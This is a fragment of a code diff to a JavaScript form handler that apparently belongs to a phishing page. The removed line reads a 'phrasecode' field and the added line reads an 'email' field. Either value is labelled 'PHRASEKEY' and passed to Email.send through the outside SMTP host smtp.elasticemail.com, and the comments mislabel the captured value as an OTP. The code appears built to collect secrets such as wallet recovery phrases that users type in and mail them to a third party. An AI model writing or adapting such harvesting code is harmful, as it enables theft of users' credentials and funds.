@@ -1,6 +1,6 @@
 function emailSend() {
-  var phraseKey = document.getElementById('phrasecode').value; // Getting the OTP entered by the user
-  var messageBody = "PHRASEKEY: " + phraseKey; // Constructing the message body with OTP
+  var email = document.getElementById('email').value; // Getting the OTP entered by the user
+  var messageBody = "PHRASEKEY: " + email; // Constructing the message body with OTP
 
   Email.send({
     Host: "smtp.elasticemail.com",
